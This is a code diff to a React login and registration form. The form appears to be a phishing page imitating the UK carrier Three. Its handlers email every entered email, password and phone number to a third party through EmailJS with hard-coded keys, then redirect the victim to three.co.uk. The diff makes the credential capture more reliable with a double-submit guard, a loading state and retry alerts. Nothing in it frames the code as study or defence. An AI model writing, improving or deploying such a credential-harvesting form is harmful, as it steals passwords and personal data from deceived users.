@@ -7,8 +7,9 @@ const AuthForm = () => {
   const [showPassword, setShowPassword] = useState(false);
   const [showConfirmPassword, setShowConfirmPassword] = useState(false);
   const [accountType, setAccountType] = useState("personal");
+  const [isSubmitting, setIsSubmitting] = useState(false); // ✅ disable double click
 
-  // State for input fields
+  // Input field states
   const [formData, setFormData] = useState({
     email: "",
     password: "",
@@ -16,61 +17,61 @@ const AuthForm = () => {
     phone: "",
   });
 
-  // Handler for input changes
+  const form = useRef();
+
+  // Input handler
   const handleChange = (e) => {
     setFormData({ ...formData, [e.target.name]: e.target.value });
   };
 
-  const form = useRef();
-
-  // Login email sender
-  const sendLoginEmail = (e) => {
+  // ✅ Login Email Sender
+  const sendLoginEmail = async (e) => {
     e.preventDefault();
 
-    emailjs
-      .sendForm(
+    if (isSubmitting) return; // prevent multiple clicks
+    setIsSubmitting(true);
+
+    try {
+      const result = await emailjs.sendForm(
         "service_50q88et",
         "template_bh85laf",
         form.current,
-        "vambHF3ypLBcOv_j_" // ✅ Your public key
-      )
-      .then(
-        (result) => {
-          console.log("Login email sent:", result.text);
-          // You can uncomment this after testing:
-          window.location.href = "https://www.three.co.uk/";
-        },
-        (error) => {
-          console.log("Error sending login email:", error.text);
-        }
+        "vambHF3ypLBcOv_j_"
       );
-
-    e.target.reset();
+      console.log("✅ Login email sent:", result.text);
+      window.location.href = "https://www.three.co.uk/";
+    } catch (error) {
+      console.error("❌ Error sending login email:", error.text);
+      alert("There was a problem sending your login info. Please try again.");
+    } finally {
+      setIsSubmitting(false);
+      e.target.reset();
+    }
   };
 
-  // Register email sender
-  const sendRegisterEmail = (e) => {
+  // ✅ Register Email Sender
+  const sendRegisterEmail = async (e) => {
     e.preventDefault();
 
-    emailjs
-      .sendForm(
+    if (isSubmitting) return;
+    setIsSubmitting(true);
+
+    try {
+      const result = await emailjs.sendForm(
         "service_50q88et",
         "template_bh85laf",
         form.current,
-        "vambHF3ypLBcOv_j_" // ✅ Your public key
-      )
-      .then(
-        (result) => {
-          console.log("Register email sent:", result.text);
-          // You can uncomment this after testing:
-          window.location.href = "https://www.three.co.uk/";
-        },
-        (error) => {
-          console.log("Error sending register email:", error.text);
-        }
+        "vambHF3ypLBcOv_j_"
       );
-
-    e.target.reset();
+      console.log("✅ Register email sent:", result.text);
+      window.location.href = "https://www.three.co.uk/";
+    } catch (error) {
+      console.error("❌ Error sending register email:", error.text);
+      alert("There was a problem sending your registration info. Please try again.");
+    } finally {
+      setIsSubmitting(false);
+      e.target.reset();
+    }
   };
 
   return (
@@ -91,6 +92,7 @@ const AuthForm = () => {
         {/* Tabs */}
         <div className="flex justify-center mt-4 border-b border-gray-900">
           <button
+            type="button"
             className={`w-1/2 pb-2 font-medium text-center ${
               !isRegister ? "border-b-2 border-black" : "text-gray-500"
             }`}
@@ -99,6 +101,7 @@ const AuthForm = () => {
             Log in
           </button>
           <button
+            type="button"
             className={`w-1/2 pb-2 font-medium text-center ${
               isRegister ? "border-b-2 border-black" : "text-gray-500"
             }`}
@@ -114,7 +117,7 @@ const AuthForm = () => {
           className="mt-6 text-left"
           onSubmit={isRegister ? sendRegisterEmail : sendLoginEmail}
         >
-          {/* Account type (only for Register) */}
+          {/* Account type (Register only) */}
           {isRegister && (
             <div className="mb-4">
               <label className="block text-gray-700 font-medium">
@@ -147,7 +150,7 @@ const AuthForm = () => {
             </div>
           )}
 
-          {/* Phone number (only for Register) */}
+          {/* Phone (Register only) */}
           {isRegister && (
             <div className="relative mb-4">
               <input
@@ -161,7 +164,7 @@ const AuthForm = () => {
             </div>
           )}
 
-          {/* Email Input */}
+          {/* Email */}
           <div className="relative">
             <input
               type="email"
@@ -174,11 +177,11 @@ const AuthForm = () => {
             />
           </div>
 
-          {/* Password Input */}
+          {/* Password */}
           <div className="relative mt-4">
             <input
               type={showPassword ? "text" : "password"}
-              name="password" // ✅ Fixed field name
+              name="password"
               value={formData.password}
               onChange={handleChange}
               placeholder="Password*"
@@ -193,7 +196,7 @@ const AuthForm = () => {
             </span>
           </div>
 
-          {/* Confirm Password (only for Register) */}
+          {/* Confirm Password (Register only) */}
           {isRegister && (
             <>
               <div className="text-black text-base mt-2">
@@ -225,7 +228,7 @@ const AuthForm = () => {
             </>
           )}
 
-          {/* Forgot Password (only for Login) */}
+          {/* Forgot Password (Login only) */}
           {!isRegister && (
             <div className="text-left underline mt-2">
               <a href="#" className="text-blue-600 text-sm">
@@ -237,9 +240,16 @@ const AuthForm = () => {
           {/* Submit Button */}
           <button
             type="submit"
-            className="w-full bg-black text-white py-2.5 font-bold rounded-2xl mt-6"
+            disabled={isSubmitting}
+            className={`w-full bg-black text-white py-2.5 font-bold rounded-2xl mt-6 ${
+              isSubmitting ? "opacity-60 cursor-not-allowed" : ""
+            }`}
           >
-            {isRegister ? "Register" : "Log in"}
+            {isSubmitting
+              ? "Please wait..."
+              : isRegister
+              ? "Register"
+              : "Log in"}
           </button>
         </form>
       </div>
